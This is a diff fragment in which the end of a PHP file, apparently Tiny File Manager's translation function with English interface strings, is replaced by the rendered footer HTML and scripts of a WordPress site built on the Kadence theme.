5.975-5.975s-2.675-5.976-5.975-5.976zM16.001 12.121c2.142 0 3.879 1.736 3.879 3.879s-1.737 3.879-3.879 3.879c-2.142 0-3.879-1.737-3.879-3.879s1.736-3.879 3.879-3.879zM22.212 8.393c-0.771 0-1.396 0.625-1.396 1.396s0.625 1.396 1.396 1.396 1.396-0.625 1.396-1.396c0-0.771-0.625-1.396-1.396-1.396v0.001z"></path>
+				</svg></span></a><a href="https://in.pinterest.com/socialfundda/" aria-label="Pinterest" target="_blank" rel="noopener noreferrer external" class="social-button header-social-item social-link-pinterest" data-wpel-link="external"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-pinterest-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="28" viewBox="0 0 24 28"><title>Pinterest</title><path d="M19.5 2c2.484 0 4.5 2.016 4.5 4.5v15c0 2.484-2.016 4.5-4.5 4.5h-11.328c0.516-0.734 1.359-2 1.687-3.281 0 0 0.141-0.531 0.828-3.266 0.422 0.797 1.625 1.484 2.906 1.484 3.813 0 6.406-3.484 6.406-8.141 0-3.516-2.984-6.797-7.516-6.797-5.641 0-8.484 4.047-8.484 7.422 0 2.031 0.781 3.844 2.438 4.531 0.266 0.109 0.516 0 0.594-0.297 0.047-0.203 0.172-0.734 0.234-0.953 0.078-0.297 0.047-0.406-0.172-0.656-0.469-0.578-0.781-1.297-0.781-2.344 0-3 2.25-5.672 5.844-5.672 3.187 0 4.937 1.937 4.937 4.547 0 3.422-1.516 6.312-3.766 6.312-1.234 0-2.172-1.031-1.875-2.297 0.359-1.5 1.047-3.125 1.047-4.203 0-0.969-0.516-1.781-1.594-1.781-1.266 0-2.281 1.313-2.281 3.063 0 0 0 1.125 0.375 1.891-1.297 5.5-1.531 6.469-1.531 6.469-0.344 1.437-0.203 3.109-0.109 3.969h-2.859c-2.484 0-4.5-2.016-4.5-4.5v-15c0-2.484 2.016-4.5 4.5-4.5h15z"></path>
+				</svg></span></a></div></div></div><!-- data-section="mobile_social" -->
+<div class="site-header-item site-header-focus-item" data-section="kadence_customizer_header_mobile_search_bar">
+	<div class="header-mobile-search-bar header-item-search-bar"><form role="search" method="get" class="search-form" action="https://socialfunda.net/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			<div class="kadence-search-icon-wrap"><span class="kadence-svg-iconset"><svg aria-hidden="true" class="kadence-svg-icon kadence-search-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="26" height="28" viewBox="0 0 26 28"><title>Search</title><path d="M18 13c0-3.859-3.141-7-7-7s-7 3.141-7 7 3.141 7 7 7 7-3.141 7-7zM26 26c0 1.094-0.906 2-2 2-0.531 0-1.047-0.219-1.406-0.594l-5.359-5.344c-1.828 1.266-4.016 1.937-6.234 1.937-6.078 0-11-4.922-11-11s4.922-11 11-11 11 4.922 11 11c0 2.219-0.672 4.406-1.937 6.234l5.359 5.359c0.359 0.359 0.578 0.875 0.578 1.406z"></path>
+				</svg></span></div></form></div></div><!-- data-section="header_mobile_search_bar" -->
+							</div>
+		</div>
+	</div>
+	<script id="ez-toc-scroll-scriptjs-js-extra">
+var eztoc_smooth_local = {"scroll_offset":"30","add_request_uri":"","add_self_reference_link":""};
+//# sourceURL=ez-toc-scroll-scriptjs-js-extra
+</script>
+<script src="https://socialfunda.net/wp-content/plugins/easy-table-of-contents/assets/js/smooth_scroll.min.js?ver=2.0.81" id="ez-toc-scroll-scriptjs-js"></script>
+<script src="https://socialfunda.net/wp-content/plugins/easy-table-of-contents/vendor/js-cookie/js.cookie.min.js?ver=2.2.1" id="ez-toc-js-cookie-js"></script>
+<script src="https://socialfunda.net/wp-content/plugins/easy-table-of-contents/vendor/sticky-kit/jquery.sticky-kit.min.js?ver=1.9.2" id="ez-toc-jquery-sticky-kit-js"></script>
+<script id="ez-toc-js-js-extra">
+var ezTOC = {"smooth_scroll":"1","visibility_hide_by_default":"1","scroll_offset":"30","fallbackIcon":"\u003Cspan class=\"\"\u003E\u003Cspan class=\"eztoc-hide\" style=\"display:none;\"\u003EToggle\u003C/span\u003E\u003Cspan class=\"ez-toc-icon-toggle-span\"\u003E\u003Csvg style=\"fill: #999;color:#999\" xmlns=\"http://www.w3.org/2000/svg\" class=\"list-377408\" width=\"20px\" height=\"20px\" viewBox=\"0 0 24 24\" fill=\"none\"\u003E\u003Cpath d=\"M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z\" fill=\"currentColor\"\u003E\u003C/path\u003E\u003C/svg\u003E\u003Csvg style=\"fill: #999;color:#999\" class=\"arrow-unsorted-368013\" xmlns=\"http://www.w3.org/2000/svg\" width=\"10px\" height=\"10px\" viewBox=\"0 0 24 24\" version=\"1.2\" baseProfile=\"tiny\"\u003E\u003Cpath d=\"M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z\"/\u003E\u003C/svg\u003E\u003C/span\u003E\u003C/span\u003E","visibility_hide_by_device":"1","chamomile_theme_is_on":""};
+//# sourceURL=ez-toc-js-js-extra
+</script>
+<script src="https://socialfunda.net/wp-content/plugins/easy-table-of-contents/assets/js/front.min.js?ver=2.0.81-1772487049" id="ez-toc-js-js"></script>
+<script src="https://socialfunda.net/wp-includes/js/comment-reply.min.js?ver=6.9.4" id="comment-reply-js" async data-wp-strategy="async" fetchpriority="low"></script>
+<script id="kadence-navigation-js-extra">
+var kadenceConfig = {"screenReader":{"expand":"Child menu","expandOf":"Child menu of","collapse":"Child menu","collapseOf":"Child menu of"},"breakPoints":{"desktop":"1024","tablet":768},"scrollOffset":"0"};
+//# sourceURL=kadence-navigation-js-extra
+</script>
+<script src="https://socialfunda.net/wp-content/themes/kadence/assets/js/navigation.min.js?ver=1.1.50" id="kadence-navigation-js" async></script>
+<script src="https://socialfunda.net/wp-content/plugins/kadence-blocks/includes/assets/js/kt-accordion.min.js?ver=3.6.5" id="kadence-blocks-accordion-js"></script>
+<script src="https://socialfunda.net/wp-content/plugins/kadence-blocks-pro/includes/assets/js/splide.min.js?ver=2.8.11" id="kad-splide-js" async></script>
+<script id="kadence-slide-init-js-extra">
+var kadenceSlideConfig = {"of":"of","to":"to","slide":"Slide","next":"Next","prev":"Previous"};
+//# sourceURL=kadence-slide-init-js-extra
+</script>
+<script src="https://socialfunda.net/wp-content/themes/kadence/assets/js/splide-init.min.js?ver=1.1.50" id="kadence-slide-init-js" async></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://socialfunda.net/wp-includes/js/wp-emoji-release.min.js?ver=6.9.4"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
+//# sourceURL=https://socialfunda.net/wp-includes/js/wp-emoji-loader.min.js
+</script>
+	<div id="search-drawer" class="popup-drawer popup-drawer-layout-fullwidth" data-drawer-target-string="#search-drawer"
+			>
+		<div class="drawer-overlay" data-drawer-target-string="#search-drawer"></div>
+		<div class="drawer-inner">
+			<div class="drawer-header">
+				<button class="search-toggle-close drawer-toggle" aria-label="Close search"  data-toggle-target="#search-drawer" data-toggle-body-class="showing-popup-drawer-from-full" aria-expanded="false" data-set-focus=".search-toggle-open"
+							>
+					<span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-close-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Toggle Menu Close</title><path d="M5.293 6.707l5.293 5.293-5.293 5.293c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0l5.293-5.293 5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-5.293-5.293 5.293-5.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-5.293 5.293-5.293-5.293c-0.391-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414z"></path>
+				</svg></span>				</button>
+			</div>
+			<div class="drawer-content">
+				<form role="search" method="get" class="search-form" action="https://socialfunda.net/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			<div class="kadence-search-icon-wrap"><span class="kadence-svg-iconset"><svg aria-hidden="true" class="kadence-svg-icon kadence-search-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="26" height="28" viewBox="0 0 26 28"><title>Search</title><path d="M18 13c0-3.859-3.141-7-7-7s-7 3.141-7 7 3.141 7 7 7 7-3.141 7-7zM26 26c0 1.094-0.906 2-2 2-0.531 0-1.047-0.219-1.406-0.594l-5.359-5.344c-1.828 1.266-4.016 1.937-6.234 1.937-6.078 0-11-4.922-11-11s4.922-11 11-11 11 4.922 11 11c0 2.219-0.672 4.406-1.937 6.234l5.359 5.359c0.359 0.359 0.578 0.875 0.578 1.406z"></path>
+				</svg></span></div></form>			</div>
+		</div>
+	</div>
+	</body>
 </html>
-<?php
-}
 
-/**
- * Language Translation System
- * @param string $txt
- * @return string
- */
-function lng($txt) {
-    global $lang;
 
-    // English Language
-    $tr['en']['AppName']        = 'Tiny File Manager';      $tr['en']['AppTitle']           = 'File Manager';
-    $tr['en']['Login']          = 'Sign in';                $tr['en']['Username']           = 'Username';
-    $tr['en']['Password']       = 'Password';               $tr['en']['Logout']             = 'Sign Out';
-    $tr['en']['Move']           = 'Move';                   $tr['en']['Copy']               = 'Copy';
-    $tr['en']['Save']           = 'Save';                   $tr['en']['SelectAll']          = 'Select all';
-    $tr['en']['UnSelectAll']    = 'Unselect all';           $tr['en']['File']               = 'File';
-    $tr['en']['Back']           = 'Back';                   $tr['en']['Size']               = 'Size';
-    $tr['en']['Perms']          = 'Perms';                  $tr['en']['Modified']           = 'Modified';
-    $tr['en']['Owner']          = 'Owner';                  $tr['en']['Search']             = 'Search';
-    $tr['en']['NewItem']        = 'New Item';               $tr['en']['Folder']             = 'Folder';
-    $tr['en']['Delete']         = 'Delete';                 $tr['en']['Rename']             = 'Rename';
-    $tr['en']['CopyTo']         = 'Copy to';                $tr['en']['DirectLink']         = 'Direct link';
-    $tr['en']['UploadingFiles'] = 'Upload Files';           $tr['en']['ChangePermissions']  = 'Change Permissions';
-    $tr['en']['Copying']        = 'Copying';                $tr['en']['CreateNewItem']      = 'Create New Item';
-    $tr['en']['Name']           = 'Name';                   $tr['en']['AdvancedEditor']     = 'Advanced Editor';
-    $tr['en']['Actions']        = 'Actions';                $tr['en']['Folder is empty']    = 'Folder is empty';
-    $tr['en']['Upload']         = 'Upload';                 $tr['en']['Cancel']             = 'Cancel';
-    $tr['en']['InvertSelection']= 'Invert Selection';       $tr['en']['DestinationFolder']  = 'Destination Folder';
-    $tr['en']['ItemType']       = 'Item Type';              $tr['en']['ItemName']           = 'Item Name';
-    $tr['en']['CreateNow']      = 'Create Now';             $tr['en']['Download']           = 'Download';
-    $tr['en']['Open']           = 'Open';                   $tr['en']['UnZip']              = 'UnZip';
-    $tr['en']['UnZipToFolder']  = 'UnZip to folder';        $tr['en']['Edit']               = 'Edit';
-    $tr['en']['NormalEditor']   = 'Normal Editor';          $tr['en']['BackUp']             = 'Back Up';
-    $tr['en']['SourceFolder']   = 'Source Folder';          $tr['en']['Files']              = 'Files';
-    $tr['en']['Move']           = 'Move';                   $tr['en']['Change']             = 'Change';
-    $tr['en']['Settings']       = 'Settings';               $tr['en']['Language']           = 'Language';        
-    $tr['en']['ErrorReporting'] = 'Error Reporting';        $tr['en']['ShowHiddenFiles']    = 'Show Hidden Files';
-    $tr['en']['Help']           = 'Help';                   $tr['en']['Created']            = 'Created';
-    $tr['en']['Help Documents'] = 'Help Documents';         $tr['en']['Report Issue']       = 'Report Issue';
-    $tr['en']['Generate']       = 'Generate';               $tr['en']['FullSize']           = 'Full Size';              
-    $tr['en']['HideColumns']    = 'Hide Perms/Owner columns';$tr['en']['You are logged in'] = 'You are logged in';
-    $tr['en']['Nothing selected']   = 'Nothing selected';   $tr['en']['Paths must be not equal']    = 'Paths must be not equal';
-    $tr['en']['Renamed from']       = 'Renamed from';       $tr['en']['Archive not unpacked']       = 'Archive not unpacked';
-    $tr['en']['Deleted']            = 'Deleted';            $tr['en']['Archive not created']        = 'Archive not created';
-    $tr['en']['Copied from']        = 'Copied from';        $tr['en']['Permissions changed']        = 'Permissions changed';
-    $tr['en']['to']                 = 'to';                 $tr['en']['Saved Successfully']         = 'Saved Successfully';
-    $tr['en']['not found!']         = 'not found!';         $tr['en']['File Saved Successfully']    = 'File Saved Successfully';
-    $tr['en']['Archive']            = 'Archive';            $tr['en']['Permissions not changed']    = 'Permissions not changed';
-    $tr['en']['Select folder']      = 'Select folder';      $tr['en']['Source path not defined']    = 'Source path not defined';
-    $tr['en']['already exists']     = 'already exists';     $tr['en']['Error while moving from']    = 'Error while moving from';
-    $tr['en']['Create archive?']    = 'Create archive?';    $tr['en']['Invalid file or folder name']    = 'Invalid file or folder name';
-    $tr['en']['Archive unpacked']   = 'Archive unpacked';   $tr['en']['File extension is not allowed']  = 'File extension is not allowed';
-    $tr['en']['Root path']          = 'Root path';          $tr['en']['Error while renaming from']  = 'Error while renaming from';
-    $tr['en']['File not found']     = 'File not found';     $tr['en']['Error while deleting items'] = 'Error while deleting items';
-    $tr['en']['Moved from']         = 'Moved from';         $tr['en']['Generate new password hash'] = 'Generate new password hash';
-    $tr['en']['Login failed. Invalid username or password'] = 'Login failed. Invalid username or password';
-    $tr['en']['password_hash not supported, Upgrade PHP version'] = 'password_hash not supported, Upgrade PHP version';
-    $tr['en']['Advanced Search']    = 'Advanced Search';    $tr['en']['Error while copying from']    = 'Error while copying from';
-    $tr['en']['Invalid characters in file name']                = 'Invalid characters in file name';
-    $tr['en']['FILE EXTENSION HAS NOT SUPPORTED']               = 'FILE EXTENSION HAS NOT SUPPORTED';
-    $tr['en']['Selected files and folder deleted']              = 'Selected files and folder deleted';
-    $tr['en']['Error while fetching archive info']              = 'Error while fetching archive info';
-    $tr['en']['Delete selected files and folders?']             = 'Delete selected files and folders?';
-    $tr['en']['Search file in folder and subfolders...']        = 'Search file in folder and subfolders...';
-    $tr['en']['Access denied. IP restriction applicable']       = 'Access denied. IP restriction applicable';
-    $tr['en']['Invalid characters in file or folder name']      = 'Invalid characters in file or folder name';
-    $tr['en']['Operations with archives are not available']     = 'Operations with archives are not available';
-    $tr['en']['File or folder with this path already exists']   = 'File or folder with this path already exists';
-    $tr['en']['Are you sure want to rename?']                   = 'Are you sure want to rename?';
-    $tr['en']['Are you sure want to']                           = 'Are you sure want to';
-
-    $i18n = fm_get_translations($tr);
-    $tr = $i18n ? $i18n : $tr;
-
-    if (!strlen($lang)) $lang = 'en';
-    if (isset($tr[$lang][$txt])) return fm_enc($tr[$lang][$txt]);
-    else if (isset($tr['en'][$txt])) return fm_enc($tr['en'][$txt]);
-    else return "$txt";
-}
-
-?>
+<!-- Page supported by LiteSpeed Cache 7.7 on 2026-04-17 04:48:59 -->
